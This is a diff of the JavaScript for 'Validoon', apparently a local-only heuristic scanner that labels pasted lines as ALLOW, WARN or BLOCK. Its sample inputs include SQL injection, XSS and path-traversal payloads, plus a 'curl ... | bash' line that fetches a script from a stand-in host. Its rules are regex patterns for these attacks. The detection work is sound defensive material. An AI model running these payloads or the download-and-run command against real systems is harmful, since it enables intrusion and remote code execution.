@@ -1,347 +1,353 @@
-/* Validoon - minimal local triage engine (no network). */
-/* v1.0 */
-
+// app.js
 (() => {
   "use strict";
 
-  // ---------- DOM helpers ----------
   const $ = (id) => document.getElementById(id);
-  const el = {
+
+  const els = {
+    year: $("year"),
+
+    txtInput: $("txtInput"),
     btnRun: $("btnRun"),
     btnExport: $("btnExport"),
     btnTestA: $("btnTestA"),
     btnTestB: $("btnTestB"),
     btnClear: $("btnClear"),
-    input: $("inputStream"),
 
-    verdictLabel: $("verdictLabel"),
-    peakSeverity: $("peakSeverity"),
-    confidence: $("confidence"),
+    lblVerdict: $("lblVerdict"),
+    lblPeakSeverity: $("lblPeakSeverity"),
+    lblConfidence: $("lblConfidence"),
 
-    countScans: $("countScans"),
-    countAllow: $("countAllow"),
-    countWarn: $("countWarn"),
-    countBlock: $("countBlock"),
+    lblScans: $("lblScans"),
+    lblAllow: $("lblAllow"),
+    lblWarn: $("lblWarn"),
+    lblBlock: $("lblBlock"),
 
-    activeSignals: $("activeSignals"),
-    primaryReasons: $("primaryReasons"),
-    remediationSteps: $("remediationSteps"),
-    tableBody: $("resultsTableBody"),
+    chipsSignals: $("chipsSignals"),
+    listReasons: $("listReasons"),
+    listRemediation: $("listRemediation"),
+
+    tblBody: $("tblBody"),
+
+    btnDocs: $("btnDocs"),
+    btnAbout: $("btnAbout"),
+    modalBackdrop: $("modalBackdrop"),
+    modalTitle: $("modalTitle"),
+    modalBody: $("modalBody"),
+    btnCloseModal: $("btnCloseModal"),
   };
 
-  // Guard: if any required element is missing, show a clear error (instead of blank page)
+  // Hard-fail guard (prevents "missing element #btnRun" errors)
   const requiredIds = [
-    "btnRun","btnExport","btnTestA","btnTestB","btnClear","inputStream",
-    "verdictLabel","peakSeverity","confidence",
-    "countScans","countAllow","countWarn","countBlock",
-    "activeSignals","primaryReasons","remediationSteps","resultsTableBody"
+    "txtInput","btnRun","btnExport","btnTestA","btnTestB","btnClear",
+    "lblVerdict","lblPeakSeverity","lblConfidence",
+    "lblScans","lblAllow","lblWarn","lblBlock",
+    "chipsSignals","listReasons","listRemediation","tblBody",
+    "modalBackdrop","modalTitle","modalBody","btnCloseModal"
   ];
   for (const id of requiredIds) {
     if (!$(id)) {
-      console.error(`Validoon: missing element #${id}`);
+      // Visible error in console, but do not crash the page
+      console.error("Validoon: missing element #" + id);
       return;
     }
   }
 
-  // ---------- Test payloads ----------
-  const TEST_A = [
-    "https://example.com/",
-    "Normal entry: user_id=42 action=view_report",
-    "hello world"
-  ].join("\n");
+  els.year.textContent = String(new Date().getFullYear());
 
-  const TEST_B = [
-    "https://accounts.google.com/signin/v2/identifier?service=mail&continue=https://mail.google.com/mail/",
-    "http://example.com/login?redirect=https://evil.invalid",
-    "SELECT * FROM users WHERE id='1' OR 1=1;",
-    "<script>alert(1)</script>",
-    "../..//etc/passwd",
-    "VGhpcyBpcyBhIHRlc3QgYmFzZTY0IHBheWxvYWQ="
-  ].join("\n");
+  // ---------------------------
+  // Heuristic scanner (local-only)
+  // ---------------------------
+  const RULES = [
+    { key:"INSECURE_HTTP", type:"URL", weight:18, conf:0.70, test:s => /^http:\/\//i.test(s), reason:"URL uses HTTP (unencrypted).", fix:"Prefer HTTPS; block http links in pipelines." },
+    { key:"REDIRECT_PARAM", type:"URL", weight:22, conf:0.78, test:s => /\b(redirect|return|next|url)=https?:\/\//i.test(s), reason:"Potential open-redirect parameter present.", fix:"Allowlist redirect targets; validate return URLs server-side." },
+    { key:"AUTH_ENDPOINT", type:"URL", weight:16, conf:0.68, test:s => /(login|signin|oauth|authorize|token|callback)/i.test(s) && /https?:\/\//i.test(s), reason:"Authentication-related endpoint detected.", fix:"Verify domain and path; apply strict input validation." },
 
-  // ---------- Core detection ----------
-  const RX = {
-    url: /^(https?:\/\/|www\.)/i,
-    insecureHttp: /^http:\/\//i,
-    redirectParam: /(?:\?|&)(?:redirect|redir|return|returnto|continue|next|url)=/i,
-    authEndpoint: /\/(signin|login|oauth|authorize|auth)\b/i,
-    sqlTautology: /\b(or)\s+1\s*=\s*1\b/i,
-    sqlUnionAll: /\bunion\s+all\s+select\b/i,
-    xssScript: /<\s*script\b|onerror\s*=|onload\s*=/i,
-    lfiEtcPasswd: /(\.\.\/)+|\/etc\/passwd\b/i,
-    base64Like: /^(?:[A-Za-z0-9+\/]{20,}={0,2})$/,
-    cmdChain: /(\&\&|\|\||;)\s*(curl|wget|powershell|bash|sh)\b/i,
-    homoglyphRisk: /[^\x00-\x7F]/, // non-ASCII
-  };
+    { key:"SQLI_TAUTOLOGY", type:"Exploit", weight:30, conf:0.90, test:s => /\b(or)\s+1\s*=\s*1\b/i.test(s) || /'\s*or\s*'1'\s*=\s*'1/i.test(s), reason:"OR 1=1 tautology detected (SQLi).", fix:"Use parameterized queries; add WAF rules for tautologies." },
+    { key:"SQLI_UNION_ALL", type:"Exploit", weight:34, conf:0.92, test:s => /\bunion\s+all\s+select\b/i.test(s), reason:"UNION ALL SELECT indicates SQL injection attempt.", fix:"Use prepared statements; sanitize/validate inputs; add SQLi detection." },
 
-  function shannonEntropy(str) {
-    if (!str) return 0;
-    const s = String(str);
-    const map = new Map();
-    for (const ch of s) map.set(ch, (map.get(ch) || 0) + 1);
+    { key:"XSS_SCRIPT", type:"Exploit", weight:28, conf:0.90, test:s => /<\s*script\b/i.test(s) || /\bon\w+\s*=\s*["']?/i.test(s), reason:"<script> tag or inline event handler found (XSS payload).", fix:"Escape output; enforce CSP (server headers); strip dangerous HTML." },
+
+    { key:"LF_ETC_PASSWD", type:"Exploit", weight:26, conf:0.90, test:s => /\/etc\/passwd/i.test(s), reason:"/etc/passwd reference indicates LFI attempt.", fix:"Block path traversal; enforce allowlist paths; normalize and validate." },
+    { key:"LF_PATH_TRAVERSAL", type:"Exploit", weight:24, conf:0.85, test:s => /(\.\.\/){2,}/.test(s) || /(\.\.\\){2,}/.test(s), reason:"Directory traversal pattern detected.", fix:"Normalize path; reject '..' segments; use allowlist routing." },
+
+    { key:"BASE64_DECODE", type:"Data", weight:10, conf:0.55, test:s => /(^|[^A-Za-z0-9+/=])[A-Za-z0-9+/]{60,}={0,2}([^A-Za-z0-9+/=]|$)/.test(s), reason:"High-likelihood base64 blob detected.", fix:"If unexpected, treat as suspicious; decode safely and inspect." },
+
+    { key:"HOMOGRAPH_RISK", type:"URL", weight:14, conf:0.65, test:s => /https?:\/\/[^\s/]*[^\x00-\x7F]/.test(s) || /xn--/i.test(s), reason:"Non-ASCII / punycode host indicates possible homograph risk.", fix:"Verify domain carefully; show punycode; enforce allowlist." },
+
+    { key:"CMD_CHAIN", type:"Exploit", weight:20, conf:0.78, test:s => /(\|\||&&|;)\s*(curl|wget|bash|sh|powershell|cmd|python)\b/i.test(s), reason:"Command chaining / downloader pattern detected.", fix:"Block shell metacharacters; isolate execution; validate inputs." },
+  ];
+
+  function entropy(str) {
+    const s = String(str || "");
+    if (!s.length) return 0;
+    const freq = new Map();
+    for (const ch of s) freq.set(ch, (freq.get(ch) || 0) + 1);
     let ent = 0;
-    for (const [, count] of map) {
+    for (const [, count] of freq) {
       const p = count / s.length;
       ent -= p * Math.log2(p);
     }
-    return Number(ent.toFixed(2));
+    return ent;
   }
 
-  function analyzeLine(line) {
-    const text = String(line || "").trim();
-    if (!text) return null;
+  function decisionFromScore(score) {
+    if (score >= 60) return "BLOCK";
+    if (score >= 20) return "WARN";
+    return "ALLOW";
+  }
 
-    const signals = [];
+  function clamp(n, a, b){ return Math.max(a, Math.min(b, n)); }
+
+  function analyzeLine(line) {
+    const raw = line.trim();
+    if (!raw) return null;
+
+    const hits = [];
+    let score = 0;
+    let confSum = 0;
+    let confW = 0;
+
+    for (const r of RULES) {
+      if (r.test(raw)) {
+        hits.push(r);
+        score += r.weight;
+        confSum += r.conf * r.weight;
+        confW += r.weight;
+      }
+    }
+
+    const ent = entropy(raw);
+    // Obfuscation hint via entropy
+    if (ent >= 4.6 && raw.length >= 18) {
+      hits.push({
+        key:"OBFUSCATION_HINT", type:"Data", weight:10, conf:0.58,
+        reason:"High entropy string may indicate obfuscation.",
+        fix:"If unexpected, decode/inspect safely; treat as suspicious."
+      });
+      score += 10;
+      confSum += 0.58 * 10;
+      confW += 10;
+    }
+
+    const decision = decisionFromScore(score);
+    const severity = clamp(Math.round(score), 0, 100);
+    const confidence = confW ? clamp(Math.round((confSum / confW) * 100), 0, 100) : 52;
+
+    // type: choose strongest hit type
+    let type = "Data";
+    if (/https?:\/\//i.test(raw)) type = "URL";
+    if (hits.some(h => h.type === "Exploit")) type = "Exploit";
+
+    const reasons = hits.map(h => h.reason);
+    const remediation = hits.map(h => h.fix);
+
+    // signals are unique keys
+    const signals = Array.from(new Set(hits.map(h => h.key)));
+
+    return {
+      segment: raw,
+      type,
+      decision,
+      severity,
+      confidence,
+      entropy: Number(ent.toFixed(2)),
+      signals,
+      reasons,
+      remediation
+    };
+  }
+
+  function summarize(results) {
+    let allow = 0, warn = 0, block = 0;
+    let peakSeverity = 0;
+    let peakConf = 0;
+    const signalSet = new Set();
     const reasons = [];
     const remediation = [];
 
-    // type heuristic
-    let type = "Data";
-    if (RX.url.test(text)) type = "URL";
-    if (RX.sqlUnionAll.test(text) || RX.sqlTautology.test(text)) type = "Exploit";
-    if (RX.xssScript.test(text) || RX.lfiEtcPasswd.test(text) || RX.cmdChain.test(text)) type = "Exploit";
+    for (const r of results) {
+      if (r.decision === "ALLOW") allow++;
+      else if (r.decision === "WARN") warn++;
+      else block++;
 
-    // signals
-    if (RX.redirectParam.test(text)) signals.push("REDIRECT_PARAM");
-    if (RX.authEndpoint.test(text)) signals.push("AUTH_ENDPOINT");
-    if (RX.insecureHttp.test(text)) signals.push("INSECURE_HTTP");
-    if (RX.sqlTautology.test(text)) signals.push("SQLI_SQL_TAUTOLOGY");
-    if (RX.sqlUnionAll.test(text)) signals.push("SQLI_SQL_UNION_ALL");
-    if (RX.xssScript.test(text)) signals.push("XSS_XSS_SCRIPT");
-    if (RX.lfiEtcPasswd.test(text)) signals.push("LFI_LFI_ETC_PASSWD");
-    if (RX.cmdChain.test(text)) signals.push("CMDI_CMD_CHAIN");
+      peakSeverity = Math.max(peakSeverity, r.severity);
+      peakConf = Math.max(peakConf, r.confidence);
 
-    // base64 (only if looks like base64 and has high-ish entropy)
-    const ent = shannonEntropy(text);
-    const looksBase64 = RX.base64Like.test(text) && ent >= 4.0;
-    if (looksBase64) signals.push("BASE64_DECODE");
-
-    // homoglyph risk (only meaningful for URL-ish strings or domain-like)
-    if ((type === "URL" || /[a-z0-9.-]+\.[a-z]{2,}/i.test(text)) && RX.homoglyphRisk.test(text)) {
-      signals.push("HOMOGRAPH_RISK");
+      for (const s of r.signals) signalSet.add(s);
     }
 
-    // scoring
-    let severity = 0;
-    const add = (pts, why, fix) => {
-      severity += pts;
-      if (why) reasons.push(why);
-      if (fix) remediation.push(fix);
-    };
+    // Pick top reasons/remediation from the worst item
+    const worst = results.slice().sort((a,b) => b.severity - a.severity)[0];
+    if (worst) {
+      for (const x of worst.reasons) if (x && !reasons.includes(x)) reasons.push(x);
+      for (const x of worst.remediation) if (x && !remediation.includes(x)) remediation.push(x);
+    }
 
-    if (signals.includes("INSECURE_HTTP")) add(25, "URL uses HTTP (unencrypted).", "Prefer HTTPS; block plain HTTP in production.");
-    if (signals.includes("REDIRECT_PARAM")) add(25, "Potential open-redirect parameter present.", "Validate/allowlist redirect targets; avoid user-controlled redirect URLs.");
-    if (signals.includes("AUTH_ENDPOINT")) add(15, "Authentication-related endpoint detected.", "Treat auth endpoints as high-sensitivity; enable extra logging and throttling.");
-    if (signals.includes("HOMOGRAPH_RISK")) add(20, "Suspicious host (non-ASCII) indicates possible homoglyph/phishing risk.", "Normalize to punycode, alert, and verify domain ownership.");
-    if (signals.includes("SQLI_SQL_TAUTOLOGY")) add(35, "OR 1=1 tautology detected (SQLi).", "Use parameterized queries/prepared statements; sanitize and validate server-side.");
-    if (signals.includes("SQLI_SQL_UNION_ALL")) add(45, "UNION ALL SELECT indicates SQL injection attempt.", "Block payloads; enforce parameterization and WAF rules.");
-    if (signals.includes("XSS_XSS_SCRIPT")) add(40, "<script> or inline event handler indicates XSS payload.", "Escape/encode output; apply CSP; sanitize input; use template auto-escaping.");
-    if (signals.includes("LFI_LFI_ETC_PASSWD")) add(45, "Directory traversal / /etc/passwd pattern detected.", "Normalize paths; deny traversal; restrict file access to allowlist directories.");
-    if (signals.includes("CMDI_CMD_CHAIN")) add(45, "Command chaining pattern detected.", "Never pass user input to shell; use safe APIs; block metacharacters.");
-    if (signals.includes("BASE64_DECODE")) add(10, "High-entropy base64-like payload detected.", "Decode and inspect in isolated environment; log for incident response.");
-
-    // Decision thresholds
-    // 0-24 ALLOW, 25-59 WARN, >=60 BLOCK
-    let decision = "ALLOW";
-    if (severity >= 60) decision = "BLOCK";
-    else if (severity >= 25) decision = "WARN";
-
-    // confidence heuristic
-    let confidence = 52; // baseline like your UI
-    confidence += Math.min(40, signals.length * 8);
-    if (type === "Exploit") confidence += 10;
-    confidence = Math.max(10, Math.min(99, confidence));
-
-    // ensure unique reasons/steps
-    const uniq = (arr) => [...new Set(arr)];
-
-    // If nothing detected: add a safe message
-    const finalReasons = reasons.length ? uniq(reasons) : ["No immediate threat detected. Routine monitoring only."];
-    const finalRem = remediation.length ? uniq(remediation) : ["Proceed with caution; verify context and source."];
-
+    const systemVerdict = block ? "DANGER" : (warn ? "SUSPICIOUS" : "SECURE");
     return {
-      segment: text,
-      type,
-      decision,
-      severity: Math.min(99, severity),
-      confidence,
-      entropy: ent,
-      signals: uniq(signals),
-      reasons: finalReasons,
-      remediation: finalRem,
+      scans: results.length,
+      allow, warn, block,
+      peakSeverity,
+      confidence: peakConf || 52,
+      signals: Array.from(signalSet),
+      systemVerdict,
+      reasons,
+      remediation
     };
   }
 
-  function analyzeAll(lines) {
+  function setVerdictUI(summary) {
+    const v = summary.systemVerdict;
+
+    els.lblVerdict.textContent = v;
+    els.lblVerdict.classList.remove("ok","warn","bad");
+    if (v === "SECURE") els.lblVerdict.classList.add("ok");
+    else if (v === "SUSPICIOUS") els.lblVerdict.classList.add("warn");
+    else els.lblVerdict.classList.add("bad");
+
+    els.lblPeakSeverity.textContent = summary.peakSeverity + "%";
+    els.lblConfidence.textContent = summary.confidence + "%";
+
+    els.lblScans.textContent = String(summary.scans);
+    els.lblAllow.textContent = String(summary.allow);
+    els.lblWarn.textContent = String(summary.warn);
+    els.lblBlock.textContent = String(summary.block);
+
+    // Chips
+    els.chipsSignals.innerHTML = "";
+    if (!summary.signals.length) {
+      const span = document.createElement("span");
+      span.className = "chip muted";
+      span.textContent = "No signals";
+      els.chipsSignals.appendChild(span);
+    } else {
+      for (const s of summary.signals) {
+        const span = document.createElement("span");
+        span.className = "chip";
+        if (/SQLI|XSS|LF_|CMD|UNION|TAUTOLOGY/.test(s)) span.classList.add("bad");
+        else if (/INSECURE|REDIRECT|HOMOGRAPH|OBFUSCATION/.test(s)) span.classList.add("warn");
+        else span.classList.add("ok");
+        span.textContent = s;
+        els.chipsSignals.appendChild(span);
+      }
+    }
+
+    // Lists
+    els.listReasons.innerHTML = "";
+    (summary.reasons.length ? summary.reasons : ["No immediate threat detected. Routine monitoring only."]).forEach(t => {
+      const li = document.createElement("li");
+      li.textContent = t;
+      els.listReasons.appendChild(li);
+    });
+
+    els.listRemediation.innerHTML = "";
+    (summary.remediation.length ? summary.remediation : [
+      "Proceed with caution; verify context and source.",
+      "If URL: open in isolated environment and verify domain carefully.",
+      "Inspect logs for related activity and source."
+    ]).forEach(t => {
+      const li = document.createElement("li");
+      li.textContent = t;
+      els.listRemediation.appendChild(li);
+    });
+  }
+
+  function badge(decision) {
+    const span = document.createElement("span");
+    span.className = "badge";
+    if (decision === "ALLOW") span.classList.add("ok");
+    if (decision === "WARN") span.classList.add("warn");
+    if (decision === "BLOCK") span.classList.add("bad");
+    span.textContent = decision;
+    return span;
+  }
+
+  function renderTable(results) {
+    els.tblBody.innerHTML = "";
+    if (!results.length) {
+      const tr = document.createElement("tr");
+      const td = document.createElement("td");
+      td.colSpan = 7;
+      td.className = "muted";
+      td.textContent = "No results yet.";
+      tr.appendChild(td);
+      els.tblBody.appendChild(tr);
+      return;
+    }
+
+    results.forEach((r, idx) => {
+      const tr = document.createElement("tr");
+
+      const tdLine = document.createElement("td");
+      tdLine.textContent = String(idx + 1);
+      tr.appendChild(tdLine);
+
+      const tdSeg = document.createElement("td");
+      tdSeg.textContent = r.segment;
+      tr.appendChild(tdSeg);
+
+      const tdType = document.createElement("td");
+      tdType.textContent = r.type;
+      tdType.className = "muted";
+      tr.appendChild(tdType);
+
+      const tdDecision = document.createElement("td");
+      tdDecision.appendChild(badge(r.decision));
+      tr.appendChild(tdDecision);
+
+      const tdSev = document.createElement("td");
+      tdSev.textContent = r.severity + "%";
+      tr.appendChild(tdSev);
+
+      const tdConf = document.createElement("td");
+      tdConf.textContent = r.confidence + "%";
+      tr.appendChild(tdConf);
+
+      const tdEnt = document.createElement("td");
+      tdEnt.textContent = String(r.entropy);
+      tdEnt.className = "muted";
+      tr.appendChild(tdEnt);
+
+      els.tblBody.appendChild(tr);
+    });
+  }
+
+  function getLines() {
+    return els.txtInput.value
+      .split(/\r?\n/)
+      .map(s => s.trim())
+      .filter(Boolean);
+  }
+
+  function runScan() {
+    const lines = getLines();
     const results = [];
     for (const line of lines) {
       const r = analyzeLine(line);
       if (r) results.push(r);
     }
-    return results;
-  }
 
-  // ---------- Rendering ----------
-  function clearChildren(node) {
-    while (node.firstChild) node.removeChild(node.firstChild);
-  }
+    const sum = summarize(results);
+    setVerdictUI(sum);
+    renderTable(results);
 
-  function chip(text) {
-    const d = document.createElement("span");
-    d.className = "chip";
-    d.textContent = text;
-    return d;
-  }
-
-  function badge(decision) {
-    const span = document.createElement("span");
-    span.className = "badge badge--" + decision.toLowerCase();
-    span.textContent = decision;
-    return span;
-  }
-
-  function setVerdictTheme(label) {
-    // set class on root for theming via CSS
-    const root = document.documentElement;
-    root.classList.remove("theme-allow","theme-warn","theme-block");
-    if (label === "SECURE") root.classList.add("theme-allow");
-    else if (label === "SUSPICIOUS") root.classList.add("theme-warn");
-    else if (label === "DANGER") root.classList.add("theme-block");
-  }
-
-  function computeSystemVerdict(results) {
-    if (!results.length) {
-      return { label: "—", peakSeverity: 0, confidence: 0 };
-    }
-    let peak = 0;
-    let conf = 0;
-
-    let anyBlock = false;
-    let anyWarn = false;
-
-    for (const r of results) {
-      peak = Math.max(peak, r.severity);
-      conf = Math.max(conf, r.confidence);
-      if (r.decision === "BLOCK") anyBlock = true;
-      else if (r.decision === "WARN") anyWarn = true;
-    }
-
-    let label = "SECURE";
-    if (anyBlock) label = "DANGER";
-    else if (anyWarn) label = "SUSPICIOUS";
-
-    return { label, peakSeverity: peak, confidence: conf };
-  }
-
-  function render(results) {
-    // counters
-    const scans = results.length;
-    const allow = results.filter(r => r.decision === "ALLOW").length;
-    const warn  = results.filter(r => r.decision === "WARN").length;
-    const block = results.filter(r => r.decision === "BLOCK").length;
-
-    el.countScans.textContent = String(scans);
-    el.countAllow.textContent = String(allow);
-    el.countWarn.textContent  = String(warn);
-    el.countBlock.textContent = String(block);
-
-    const sys = computeSystemVerdict(results);
-    el.verdictLabel.textContent = sys.label;
-    el.peakSeverity.textContent = `${sys.peakSeverity}%`;
-    el.confidence.textContent = `${sys.confidence}%`;
-
-    setVerdictTheme(sys.label);
-
-    // active signals (union)
-    const signalSet = new Set();
-    for (const r of results) for (const s of r.signals) signalSet.add(s);
-
-    clearChildren(el.activeSignals);
-    const sigArr = [...signalSet].slice(0, 16);
-    if (!sigArr.length) el.activeSignals.appendChild(chip("NONE"));
-    else for (const s of sigArr) el.activeSignals.appendChild(chip(s));
-
-    // reasons (from the most severe line)
-    clearChildren(el.primaryReasons);
-    clearChildren(el.remediationSteps);
-
-    if (!results.length) {
-      const li1 = document.createElement("li");
-      li1.textContent = "Paste one item per line, then click Execute Scan.";
-      el.primaryReasons.appendChild(li1);
-
-      const li2 = document.createElement("li");
-      li2.textContent = "Use Test A/B to validate the pipeline.";
-      el.remediationSteps.appendChild(li2);
-    } else {
-      const top = results.slice().sort((a,b) => (b.severity - a.severity) || (b.confidence - a.confidence))[0];
-      for (const r of top.reasons.slice(0, 6)) {
-        const li = document.createElement("li");
-        li.textContent = r;
-        el.primaryReasons.appendChild(li);
-      }
-      for (const step of top.remediation.slice(0, 6)) {
-        const li = document.createElement("li");
-        li.textContent = step;
-        el.remediationSteps.appendChild(li);
-      }
-    }
-
-    // table
-    clearChildren(el.tableBody);
-    if (!results.length) {
-      const tr = document.createElement("tr");
-      const td = document.createElement("td");
-      td.colSpan = 6;
-      td.className = "muted";
-      td.textContent = "No results yet.";
-      tr.appendChild(td);
-      el.tableBody.appendChild(tr);
-      return;
-    }
-
-    for (const r of results) {
-      const tr = document.createElement("tr");
-
-      const tdSeg = document.createElement("td");
-      tdSeg.className = "mono";
-      tdSeg.textContent = r.segment;
-
-      const tdType = document.createElement("td");
-      tdType.textContent = r.type;
-
-      const tdDec = document.createElement("td");
-      tdDec.appendChild(badge(r.decision));
-
-      const tdSev = document.createElement("td");
-      tdSev.textContent = `${r.severity}%`;
-
-      const tdConf = document.createElement("td");
-      tdConf.textContent = `${r.confidence}%`;
-
-      const tdEnt = document.createElement("td");
-      tdEnt.textContent = String(r.entropy);
-
-      tr.appendChild(tdSeg);
-      tr.appendChild(tdType);
-      tr.appendChild(tdDec);
-      tr.appendChild(tdSev);
-      tr.appendChild(tdConf);
-      tr.appendChild(tdEnt);
-
-      el.tableBody.appendChild(tr);
-    }
-  }
-
-  function exportJSON(results) {
-    const payload = {
-      generated_at: new Date().toISOString(),
-      engine: "validoon-local",
+    // store last report for export
+    window.__VALIDOON_LAST__ = {
+      generatedAt: new Date().toISOString(),
+      system: sum,
       results
     };
-    const blob = new Blob([JSON.stringify(payload, null, 2)], { type: "application/json" });
-    const url = URL.createObjectURL(blob);
+  }
 
+  function exportJSON() {
+    const data = window.__VALIDOON_LAST__ || {
+      generatedAt: new Date().toISOString(),
+      system: summarize([]),
+      results: []
+    };
+    const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
+    const url = URL.createObjectURL(blob);
     const a = document.createElement("a");
     a.href = url;
     a.download = "validoon_report.json";
@@ -351,27 +357,88 @@
     URL.revokeObjectURL(url);
   }
 
-  // ---------- Events ----------
-  function runScan() {
-    const lines = el.input.value.split("\n").map(s => s.trim()).filter(Boolean);
-    const results = analyzeAll(lines);
-    window.__VALIDOON_LAST__ = results; // for debugging/export
-    render(results);
-  }
-
   function clearAll() {
-    el.input.value = "";
-    window.__VALIDOON_LAST__ = [];
-    render([]);
+    els.txtInput.value = "";
+    window.__VALIDOON_LAST__ = null;
+
+    setVerdictUI({
+      scans: 0, allow: 0, warn: 0, block: 0,
+      peakSeverity: 0, confidence: 0,
+      signals: [],
+      systemVerdict: "—",
+      reasons: [],
+      remediation: []
+    });
+    renderTable([]);
   }
 
-  el.btnRun.addEventListener("click", runScan);
-  el.btnExport.addEventListener("click", () => exportJSON(window.__VALIDOON_LAST__ || []));
-  el.btnTestA.addEventListener("click", () => { el.input.value = TEST_A; runScan(); });
-  el.btnTestB.addEventListener("click", () => { el.input.value = TEST_B; runScan(); });
-  el.btnClear.addEventListener("click", clearAll);
+  function loadTestA() {
+    els.txtInput.value = [
+      "https://example.com/",
+      "https://accounts.google.com/signin/v2/identifier",
+      "http://example.com/login?redirect=https://evil.invalid",
+      "SELECT * FROM users WHERE id='1' OR 1=1;",
+      "UNION ALL SELECT username,password FROM users;",
+      "<script>alert(1)</script>",
+      "../../etc/passwd",
+      "Normal entry: user_id=42 action=view_report"
+    ].join("\n");
+    runScan();
+  }
 
-  // First render
-  render([]);
+  function loadTestB() {
+    els.txtInput.value = [
+      "INFO 2026-01-03 request_id=abc123 path=/api/login status=200",
+      "GET http://insecure.example.com/callback?next=https://evil.invalid",
+      "POST /search q=' OR '1'='1",
+      "payload=QmFzZTY0RW5jb2RlZFN0cmluZ0xvbmdMb25nTG9uZ0xvbmc=",
+      "cmd=echo test && curl http://bad.example.com/p.sh | bash",
+      "https://xn--pple-43d.com/login"
+    ].join("\n");
+    runScan();
+  }
 
+  // Modal helpers
+  function openModal(title, html) {
+    els.modalTitle.textContent = title;
+    els.modalBody.innerHTML = html;
+    els.modalBackdrop.hidden = false;
+  }
+  function closeModal() {
+    els.modalBackdrop.hidden = true;
+  }
+
+  // Wire events
+  els.btnRun.addEventListener("click", runScan);
+  els.btnExport.addEventListener("click", exportJSON);
+  els.btnClear.addEventListener("click", clearAll);
+  els.btnTestA.addEventListener("click", loadTestA);
+  els.btnTestB.addEventListener("click", loadTestB);
+
+  els.btnCloseModal.addEventListener("click", closeModal);
+  els.modalBackdrop.addEventListener("click", (e) => {
+    if (e.target === els.modalBackdrop) closeModal();
+  });
+
+  els.btnDocs.addEventListener("click", (e) => {
+    e.preventDefault();
+    openModal("Tips", `
+      <ul>
+        <li>Paste one item per line (URLs, log lines, payloads).</li>
+        <li>Use <b>Test A</b> and <b>Test B</b> to verify buttons + rendering.</li>
+        <li>This demo is <b>local-only</b>: no network calls.</li>
+      </ul>
+    `);
+  });
+
+  els.btnAbout.addEventListener("click", (e) => {
+    e.preventDefault();
+    openModal("About", `
+      <p><b>Validoon</b> is a local triage UI. It applies heuristic rules to label inputs as ALLOW/WARN/BLOCK and produces an exportable JSON report.</p>
+      <p>No uploads. No external scripts.</p>
+    `);
+  });
+
+  // Initial clean state
+  clearAll();
 })();
